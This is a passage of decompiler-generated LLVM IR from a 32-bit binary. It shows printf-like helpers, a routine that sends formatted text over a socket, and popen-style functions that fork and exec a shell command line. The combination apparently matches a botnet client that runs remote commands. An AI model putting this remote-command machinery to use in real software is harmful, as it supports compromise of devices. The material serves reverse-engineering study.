  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ], [ %v4_8048626, %dec_label_pc_8048623 ]
  br label %dec_label_pc_8048659

dec_label_pc_8048636:                             ; preds = %dec_label_pc_8048663
  %v2_804863f = mul i32 %stack_var_-36.0, 10
  %v2_8048647 = load i8, i8* %stack_var_8.1, align 1
  %v3_8048647 = zext i8 %v2_8048647 to i32
  %v5_804864d = add i32 %v3_8048647, %v2_804863f
  %v1_8048650 = add i32 %v5_804864d, -48
  %v5_8048656 = add i32 %v4_8048659, 1
  %v22_8048656 = inttoptr i32 %v5_8048656 to i8*
  br label %dec_label_pc_8048659

dec_label_pc_8048659:                             ; preds = %dec_label_pc_8048659.preheader, %dec_label_pc_8048636
  %stack_var_8.1 = phi i8* [ %v22_8048656, %dec_label_pc_8048636 ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048659.preheader ]
  %stack_var_-36.0 = phi i32 [ %v1_8048650, %dec_label_pc_8048636 ], [ 0, %dec_label_pc_8048659.preheader ]
  %v4_8048659 = ptrtoint i8* %stack_var_8.1 to i32
  %v2_804865c = load i8, i8* %stack_var_8.1, align 1
  %tmp = icmp ult i8 %v2_804865c, 48
  br i1 %tmp, label %dec_label_pc_804866d, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_8048659
  %v2_8048666 = load i8, i8* %stack_var_8.1, align 1
  %tmp48 = icmp ult i8 %v2_8048666, 58
  br i1 %tmp48, label %dec_label_pc_8048636, label %dec_label_pc_804866d

dec_label_pc_804866d:                             ; preds = %dec_label_pc_8048663, %dec_label_pc_8048659
  %v2_8048670 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048673 = icmp eq i8 %v2_8048670, 115
  %v1_8048675 = icmp eq i1 %v10_8048673, false
  br i1 %v1_8048675, label %dec_label_pc_80486c4, label %dec_label_pc_8048677

dec_label_pc_8048677:                             ; preds = %dec_label_pc_804866d
  %v1_804867a = add i32 %stack_var_12.142, 4
  %v1_8048682 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048682 = load i32, i32* %v1_8048682, align 4
  %v4_8048687 = icmp eq i32 %v2_8048682, 0
  br i1 %v4_8048687, label %dec_label_pc_804869c, label %dec_label_pc_804868d

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048677
  %v5_8048690 = inttoptr i32 %v2_8048682 to i8*
  br label %dec_label_pc_804869c

dec_label_pc_804869c:                             ; preds = %dec_label_pc_8048677, %dec_label_pc_804868d
  %storemerge = phi i8* [ %v5_8048690, %dec_label_pc_804868d ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80562fd.12, i32 0, i32 0), %dec_label_pc_8048677 ]
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_80486b7 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_80486bc = add i32 %v6_80486b7, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80486c4:                             ; preds = %dec_label_pc_804866d
  %v2_80486c7 = load i8, i8* %stack_var_8.1, align 1
  %v10_80486ca = icmp eq i8 %v2_80486c7, 100
  %v1_80486cc = icmp eq i1 %v10_80486ca, false
  br i1 %v1_80486cc, label %dec_label_pc_8048718, label %dec_label_pc_80486ce

dec_label_pc_80486ce:                             ; preds = %dec_label_pc_80486c4
  %v1_80486d1 = add i32 %stack_var_12.142, 4
  %v1_80486d9 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80486d9 = load i32, i32* %v1_80486d9, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804870b = sext i32 %v2_80486d9 to i64
  %v9_804870b = call i32 @printi(i32 %tmp6, i64 %v8_804870b, i32 10, i32 1, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048710 = add i32 %v9_804870b, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048718:                             ; preds = %dec_label_pc_80486c4
  %v2_804871b = load i8, i8* %stack_var_8.1, align 1
  %v10_804871e = icmp eq i8 %v2_804871b, 120
  %v1_8048720 = icmp eq i1 %v10_804871e, false
  br i1 %v1_8048720, label %dec_label_pc_804876c, label %dec_label_pc_8048722

dec_label_pc_8048722:                             ; preds = %dec_label_pc_8048718
  %v1_8048725 = add i32 %stack_var_12.142, 4
  %v1_804872d = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804872d = load i32, i32* %v1_804872d, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804875f = sext i32 %v2_804872d to i64
  %v9_804875f = call i32 @printi(i32 %tmp6, i64 %v8_804875f, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048764 = add i32 %v9_804875f, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_804876c:                             ; preds = %dec_label_pc_8048718
  %v2_804876f = load i8, i8* %stack_var_8.1, align 1
  %v10_8048772 = icmp eq i8 %v2_804876f, 88
  %v1_8048774 = icmp eq i1 %v10_8048772, false
  br i1 %v1_8048774, label %dec_label_pc_80487c0, label %dec_label_pc_8048776

dec_label_pc_8048776:                             ; preds = %dec_label_pc_804876c
  %v1_8048779 = add i32 %stack_var_12.142, 4
  %v1_8048781 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048781 = load i32, i32* %v1_8048781, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80487b3 = sext i32 %v2_8048781 to i64
  %v9_80487b3 = call i32 @printi(i32 %tmp6, i64 %v8_80487b3, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_80487b8 = add i32 %v9_80487b3, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80487c0:                             ; preds = %dec_label_pc_804876c
  %v2_80487c3 = load i8, i8* %stack_var_8.1, align 1
  %v10_80487c6 = icmp eq i8 %v2_80487c3, 117
  %v1_80487c8 = icmp eq i1 %v10_80487c6, false
  br i1 %v1_80487c8, label %dec_label_pc_8048811, label %dec_label_pc_80487ca

dec_label_pc_80487ca:                             ; preds = %dec_label_pc_80487c0
  %v1_80487cd = add i32 %stack_var_12.142, 4
  %v1_80487d5 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80487d5 = load i32, i32* %v1_80487d5, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_8048807 = sext i32 %v2_80487d5 to i64
  %v9_8048807 = call i32 @printi(i32 %tmp6, i64 %v8_8048807, i32 10, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804880c = add i32 %v9_8048807, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048811:                             ; preds = %dec_label_pc_80487c0
  %v2_8048814 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048817 = icmp eq i8 %v2_8048814, 99
  %v1_8048819 = icmp eq i1 %v10_8048817, false
  br i1 %v1_8048819, label %dec_label_pc_804886f, label %dec_label_pc_804881b

dec_label_pc_804881b:                             ; preds = %dec_label_pc_8048811
  %v1_804881e = add i32 %stack_var_12.142, 4
  %v1_8048826 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048826 = load i32, i32* %v1_8048826, align 4
  store i32 %v2_8048826, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_804884a = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_804884f = add i32 %v6_804884a, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048854:                             ; preds = %dec_label_pc_80485ff, %dec_label_pc_80485d3
  %stack_var_8.2 = phi i8* [ %stack_var_8.444, %dec_label_pc_80485d3 ], [ %v22_80485e1, %dec_label_pc_80485ff ]
  %v2_8048857 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048857 = zext i8 %v2_8048857 to i32
  %v4_8048867 = call i32 @printchar(i32* %arg1, i32 %v3_8048857)
  %v4_804886c = add i32 %stack_var_-28.143, 1
  br label %dec_label_pc_804886f

dec_label_pc_804886f:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_804881b, %dec_label_pc_80487ca, %dec_label_pc_8048776, %dec_label_pc_804869c, %dec_label_pc_8048722, %dec_label_pc_80486ce, %dec_label_pc_8048854
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048854 ], [ %stack_var_8.1, %dec_label_pc_8048811 ], [ %stack_var_8.1, %dec_label_pc_804881b ], [ %stack_var_8.1, %dec_label_pc_80487ca ], [ %stack_var_8.1, %dec_label_pc_8048776 ], [ %stack_var_8.1, %dec_label_pc_8048722 ], [ %stack_var_8.1, %dec_label_pc_80486ce ], [ %stack_var_8.1, %dec_label_pc_804869c ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.142, %dec_label_pc_8048854 ], [ %stack_var_12.142, %dec_label_pc_8048811 ], [ %v1_804881e, %dec_label_pc_804881b ], [ %v1_80487cd, %dec_label_pc_80487ca ], [ %v1_8048779, %dec_label_pc_8048776 ], [ %v1_8048725, %dec_label_pc_8048722 ], [ %v1_80486d1, %dec_label_pc_80486ce ], [ %v1_804867a, %dec_label_pc_804869c ]
  %stack_var_-28.0 = phi i32 [ %v4_804886c, %dec_label_pc_8048854 ], [ %stack_var_-28.143, %dec_label_pc_8048811 ], [ %v5_804884f, %dec_label_pc_804881b ], [ %v5_804880c, %dec_label_pc_80487ca ], [ %v5_80487b8, %dec_label_pc_8048776 ], [ %v5_8048764, %dec_label_pc_8048722 ], [ %v5_8048710, %dec_label_pc_80486ce ], [ %v5_80486bc, %dec_label_pc_804869c ]
  %v4_804886f = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804886f = add i32 %v4_804886f, 1
  %stack_var_8.4 = inttoptr i32 %v5_804886f to i8*
  %v2_8048875 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048878 = icmp eq i8 %v2_8048875, 0
  %v1_804887a = icmp eq i1 %v4_8048878, false
  br i1 %v1_804887a, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_804886f, %dec_label_pc_80485e1, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.143, %dec_label_pc_80485e1 ], [ %stack_var_-28.0, %dec_label_pc_804886f ]
  %v4_8048880 = icmp eq i32* %arg1, null
  br i1 %v4_8048880, label %dec_label_pc_804888e, label %dec_label_pc_8048886

dec_label_pc_8048886:                             ; preds = %dec_label_pc_8048880
  %v2_8048889 = load i32, i32* %arg1, align 4
  %v1_804888b = inttoptr i32 %v2_8048889 to i8*
  store i8 0, i8* %v1_804888b, align 1
  br label %dec_label_pc_804888e

dec_label_pc_804888e:                             ; preds = %dec_label_pc_8048880, %dec_label_pc_8048886
  %v2_8048891 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048891, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804886f, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 1, 0, 12 }
  uselistorder i8* %stack_var_8.1, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 16, 15, 13 }
  uselistorder i32 %v5_8048623, { 1, 0 }
  uselistorder i8* %v22_80485e1, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in41, { 1, 0 }
  uselistorder i32 %stack_var_12.142, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.143, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i64, i32, i32, i32, i32, i32)* @printi, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804888e, { 1, 0 }
  uselistorder label %dec_label_pc_804886f, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_804869c, { 1, 0 }
  uselistorder label %dec_label_pc_8048659, { 1, 0 }
  uselistorder label %dec_label_pc_8048623, { 1, 0 }
  uselistorder label %dec_label_pc_80485d3, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048893 = load i32, i32* @ebp, align 4
  store i32 %v0_8048893, i32* %stack_var_-4, align 4
  %v4_8048893 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048893, i32* @ebp, align 4
  %v4_804889c = ptrtoint i32* %stack_var_8 to i32
  %v4_80488b4 = call i32 @print(i32* null, i32 %arg1, i32 %v4_804889c)
  %v2_80488b9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488b9, i32* @ebp, align 4
  ret i32 %v4_80488b4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488bb = load i32, i32* @ebp, align 4
  store i32 %v0_80488bb, i32* %stack_var_-4, align 4
  %v4_80488bb = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80488bb, i32* @ebp, align 4
  %v4_80488c4 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488db = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80488c4)
  %v2_80488e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488e0, i32* @ebp, align 4
  ret i32 %v4_80488db

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e5 = load i32, i32* @edi, align 4
  store i32 %v0_80488e5, i32* %stack_var_-8, align 4
  %v1_80488f0 = call i32 @malloc(i32 2048)
  store i32 %v1_80488f0, i32* %stack_var_-20, align 4
  %v3_8048911 = inttoptr i32 %v1_80488f0 to i8*
  %v4_8048911 = call i32 @__GI_memset(i8* %v3_8048911, i32 0, i32 2048)
  %v4_804891f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048936 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_804891f)
  %v3_804894c = call i32 @_strlen(i8* %v3_8048911)
  %v6_8048953 = add i32 %v1_80488f0, %v3_804894c
  %v1_8048956 = inttoptr i32 %v6_8048953 to i8*
  store i8 10, i8* %v1_8048956, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_80488f0, i32* @edi, align 4
  %v3_804896a = call i32 @_strlen(i8* %v3_8048911)
  %v4_804898a = call i32 @__libc_send(i32 %arg1, i32 %v1_80488f0, i32 %v3_804896a, i32 16384)
  %v1_8048998 = call i32 @free(i32 %v1_80488f0)
  %v2_80489a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80489a3, i32* @edi, align 4
  ret i32 %v4_804898a

; uselistorder directives
  uselistorder i32 %v1_80488f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80489a9 = load i32, i32* @edi, align 4
  store i32 %v0_80489a9, i32* %stack_var_-8, align 4
  %v4_80489ad = ptrtoint i8* %arg2 to i32
  %v2_80489b0 = load i8, i8* %arg2, align 1
  %v10_80489b3 = icmp eq i8 %v2_80489b0, 114
  br i1 %v10_80489b3, label %dec_label_pc_80489c1, label %dec_label_pc_80489b7

dec_label_pc_80489b7:                             ; preds = %entry
  %v2_80489ba = load i8, i8* %arg2, align 1
  %v10_80489bd = icmp eq i8 %v2_80489ba, 119
  %v1_80489bf = icmp eq i1 %v10_80489bd, false
  br i1 %v1_80489bf, label %dec_label_pc_8048b83, label %dec_label_pc_80489c1

dec_label_pc_80489c1:                             ; preds = %dec_label_pc_80489b7, %entry
  %v1_80489c4 = add i32 %v4_80489ad, 1
  %v1_80489c5 = inttoptr i32 %v1_80489c4 to i8*
  %v2_80489c5 = load i8, i8* %v1_80489c5, align 1
  %v4_80489c8 = icmp eq i8 %v2_80489c5, 0
  br i1 %v4_80489c8, label %dec_label_pc_80489d8, label %dec_label_pc_8048b83

dec_label_pc_80489d8:                             ; preds = %dec_label_pc_80489c1
  %v2_80489d8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80489de = call i32 @__GI_pipe(i32 %v2_80489d8)
  %v2_80489e3 = icmp slt i32 %v2_80489de, 0
  %v1_80489e5 = icmp eq i1 %v2_80489e3, false
  br i1 %v1_80489e5, label %dec_label_pc_80489f3, label %dec_label_pc_8048b83

dec_label_pc_80489f3:                             ; preds = %dec_label_pc_80489d8
  %v0_80489f3 = load i8*, i8** @global_var_805e0a0.13, align 4
  %v2_80489f8 = icmp eq i8* %v0_80489f3, null
  %v1_80489fa = icmp eq i1 %v2_80489f8, false
  br i1 %v1_80489fa, label %bb, label %dec_label_pc_80489fc

dec_label_pc_80489fc:                             ; preds = %dec_label_pc_80489f3
  %v0_80489fc = call i32 @getdtablesize()
  %tmp19 = icmp slt i32 %v0_80489fc, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048a16, label %dec_label_pc_8048b83

dec_label_pc_8048a16:                             ; preds = %dec_label_pc_80489fc
  %v2_8048a19 = mul i32 %v0_80489fc, 4
  %v2_8048a1f = call i32 @malloc(i32 %v2_8048a19)
  %v1_8048a24 = inttoptr i32 %v2_8048a1f to i8*
  store i8* %v1_8048a24, i8** @global_var_805e0a0.13, align 32
  %v2_8048a2e = icmp eq i32 %v2_8048a1f, 0
  %v1_8048a30 = icmp eq i1 %v2_8048a2e, false
  br i1 %v1_8048a30, label %dec_label_pc_8048a3e, label %dec_label_pc_8048b83

dec_label_pc_8048a3e:                             ; preds = %dec_label_pc_8048a16
  %v1_8048a41 = mul i32 %v0_80489fc, 4
  store i32 %v2_8048a1f, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048a52 = and i32 %v2_8048a1f, -256
  %v5_8048a54 = call i8* @_memset(i8* %v1_8048a24, i32 %v1_8048a52, i32 %v1_8048a41)
  br label %bb

bb:                                               ; preds = %dec_label_pc_80489f3, %dec_label_pc_8048a3e
  %v0_8048a56 = call i32 @__vfork()
  %v13_8048a64 = icmp eq i32 %v0_8048a56, -1
  br i1 %v13_8048a64, label %dec_label_pc_8048a75, label %dec_label_pc_8048a6a

dec_label_pc_8048a6a:                             ; preds = %bb
  %v4_8048a6a = icmp eq i32 %v0_8048a56, 0
  %v2_8048a9a = load i8, i8* %arg2, align 1
  %v10_8048a9d = icmp eq i8 %v2_8048a9a, 114
  %v1_8048a9f = icmp eq i1 %v10_8048a9d, false
  br i1 %v4_8048a6a, label %dec_label_pc_8048a97, label %dec_label_pc_8048b3b

dec_label_pc_8048a75:                             ; preds = %bb
  %v3_8048a75 = load i32, i32* %stack_var_-24, align 4
  %v2_8048a7b = call i32 @__libc_close(i32 %v3_8048a75)
  %v2_8048a86 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b83

dec_label_pc_8048a97:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048ad4, label %dec_label_pc_8048aa1

dec_label_pc_8048aa1:                             ; preds = %dec_label_pc_8048a97
  %v9_8048aa4 = icmp eq i32 %tmp7, 1
  br i1 %v9_8048aa4, label %dec_label_pc_8048ac7, label %dec_label_pc_8048aa9

dec_label_pc_8048aa9:                             ; preds = %dec_label_pc_8048aa1
  %v4_8048ab7 = call i32 @dup2(i32 %tmp7, i32 1)
  %v2_8048ac2 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048ac7

dec_label_pc_8048ac7:                             ; preds = %dec_label_pc_8048aa1, %dec_label_pc_8048aa9
  %v3_8048ac7 = load i32, i32* %stack_var_-24, align 4
  %v2_8048acd = call i32 @__libc_close(i32 %v3_8048ac7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048ad4:                             ; preds = %dec_label_pc_8048a97
  %v3_8048ad4 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ad7 = icmp eq i32 %v3_8048ad4, 0
  br i1 %v1_8048ad7, label %dec_label_pc_8048af9, label %dec_label_pc_8048adb

dec_label_pc_8048adb:                             ; preds = %dec_label_pc_8048ad4
  %v4_8048ae9 = call i32 @dup2(i32 %v3_8048ad4, i32 0)
  %v3_8048aee = load i32, i32* %stack_var_-24, align 4
  %v2_8048af4 = call i32 @__libc_close(i32 %v3_8048aee)
  br label %dec_label_pc_8048af9

dec_label_pc_8048af9:                             ; preds = %dec_label_pc_8048ad4, %dec_label_pc_8048adb
  %v2_8048aff = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048ac7, %dec_label_pc_8048af9
  %v8_8048b2a = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805630a.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_8056307.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8056304.14 to i32), i32 %arg1, i32 0)
  %v2_8048b36 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048b3b:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048b58, label %dec_label_pc_8048b45

dec_label_pc_8048b45:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b45 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b51 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b58:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b5e = load i32, i32* %stack_var_-24, align 4
  %v2_8048b64 = call i32 @__libc_close(i32 %v3_8048b5e)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b69:                             ; preds = %dec_label_pc_8048b45, %dec_label_pc_8048b58
  %stack_var_-28.0 = phi i32 [ %tmp7, %dec_label_pc_8048b58 ], [ %v3_8048b45, %dec_label_pc_8048b45 ]
  %v2_8048b6c = mul i32 %stack_var_-28.0, 4
  %v0_8048b71 = load i8*, i8** @global_var_805e0a0.13, align 4
  %v1_8048b71 = ptrtoint i8* %v0_8048b71 to i32
  %v2_8048b76 = add i32 %v1_8048b71, %v2_8048b6c
  %v2_8048b7b = inttoptr i32 %v2_8048b76 to i32*
  store i32 %v0_8048a56, i32* %v2_8048b7b, align 4
  br label %dec_label_pc_8048b83

dec_label_pc_8048b83:                             ; preds = %dec_label_pc_8048a16, %dec_label_pc_80489fc, %dec_label_pc_80489d8, %dec_label_pc_80489b7, %dec_label_pc_80489c1, %dec_label_pc_8048a75, %dec_label_pc_8048b69
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048a75 ], [ %stack_var_-28.0, %dec_label_pc_8048b69 ], [ -1, %dec_label_pc_80489c1 ], [ -1, %dec_label_pc_80489b7 ], [ -1, %dec_label_pc_80489d8 ], [ -1, %dec_label_pc_80489fc ], [ -1, %dec_label_pc_8048a16 ]
  %v2_8048b89 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048b89, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048a56, { 1, 2, 0 }
  uselistorder i32 %v0_80489fc, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048b83, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b69, { 1, 0 }
  uselistorder label %dec_label_pc_8048b04, { 1, 0 }
  uselistorder label %dec_label_pc_8048af9, { 1, 0 }
  uselistorder label %dec_label_pc_8048ac7, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b8c = load i32, i32* @ebp, align 4
  store i32 %v0_8048b8c, i32* %stack_var_-4, align 4
  %v0_8048b95 = load i8*, i8** @global_var_805e0a0.13, align 4
  %v2_8048b9a = icmp eq i8* %v0_8048b95, null
  br i1 %v2_8048b9a, label %dec_label_pc_8048cf9, label %dec_label_pc_8048b9e

dec_label_pc_8048b9e:                             ; preds = %entry
  %v1_8048b95 = ptrtoint i8* %v0_8048b95 to i32
  %v2_8048ba1 = mul i32 %arg1, 4
  %v2_8048bab = add i32 %v1_8048b95, %v2_8048ba1
  %v1_8048bae = inttoptr i32 %v2_8048bab to i32*
  %v2_8048bae = load i32, i32* %v1_8048bae, align 4
  %v1_8048bb0 = icmp eq i32 %v2_8048bae, 0
  %v1_8048bb2 = icmp eq i1 %v1_8048bb0, false
  br i1 %v1_8048bb2, label %dec_label_pc_8048bc3, label %dec_label_pc_8048cf9

dec_label_pc_8048bc3:                             ; preds = %dec_label_pc_8048b9e
  %v1_8048bc9 = call i32 @__libc_close(i32 %arg1)
  %v2_8048bce = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048bd7 = call i32 @sigemptyset(i32 %v2_8048bce)
  %v2_8048bed = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 2)
  %v2_8048c03 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 3)
  %v2_8048c19 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 1)
  %v4_8048c24 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048c39 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048c39 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048c39, i32 %v4_8048c24)
  %v2_8048c58 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048c3e

dec_label_pc_8048c3e:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048bc3
  %v0_8048c46 = load i8*, i8** @global_var_805e0a0.13, align 4
  %v1_8048c46 = ptrtoint i8* %v0_8048c46 to i32
  %v2_8048c4b = add i32 %v1_8048c46, %v2_8048ba1
  %v1_8048c4e = inttoptr i32 %v2_8048c4b to i32*
  %v2_8048c4e = load i32, i32* %v1_8048c4e, align 4
  %v3_8048c65 = call i32 @__libc_waitpid(i32 %v2_8048c4e, i32 %v2_8048c58, i32 0)
  %v13_8048c70 = icmp eq i32 %v3_8048c65, -1
  %v1_8048c77 = icmp eq i1 %v13_8048c70, false
  br i1 %v1_8048c77, label %dec_label_pc_8048c85, label %dec_label_pc_8048c79

dec_label_pc_8048c79:                             ; preds = %dec_label_pc_8048c3e
  %v1_8048c79 = call i32 @__errno_location(i32 %v3_8048c65)
  %v1_8048c7e = inttoptr i32 %v1_8048c79 to i32*
  %v2_8048c7e = load i32, i32* %v1_8048c7e, align 4
  %v9_8048c80 = icmp eq i32 %v2_8048c7e, 4
  br i1 %v9_8048c80, label %dec_label_pc_8048c3e, label %dec_label_pc_8048c85

dec_label_pc_8048c85:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048c3e
  %v13_8048c70.lcssa = phi i1 [ true, %dec_label_pc_8048c79 ], [ false, %dec_label_pc_8048c3e ]
  %v3_8048c9e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048c9e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048c9e, i32 0)
  %v2_8048ca9 = mul i32 %tmp6, 4
  %v0_8048cae = load i8*, i8** @global_var_805e0a0.13, align 4
  %v1_8048cae = ptrtoint i8* %v0_8048cae to i32
  %v2_8048cb3 = add i32 %v1_8048cae, %v2_8048ca9
  %v1_8048cb6 = inttoptr i32 %v2_8048cb3 to i32*
  store i32 0, i32* %v1_8048cb6, align 4
  br i1 %v13_8048c70.lcssa, label %dec_label_pc_8048ced, label %dec_label_pc_8048cc5

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c85
  %v3_8048cc5 = load i32, i32* %stack_var_-268, align 4
  %v1_8048cd1 = and i32 %v3_8048cc5, 65280
  %v2_8048cd81 = udiv i32 %v1_8048cd1, 256
  br label %dec_label_pc_8048ced

dec_label_pc_8048ced:                             ; preds = %dec_label_pc_8048c85, %dec_label_pc_8048cc5
  %storemerge2 = phi i32 [ %v2_8048cd81, %dec_label_pc_8048cc5 ], [ -1, %dec_label_pc_8048c85 ]
  %v2_8048cff.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048cf9

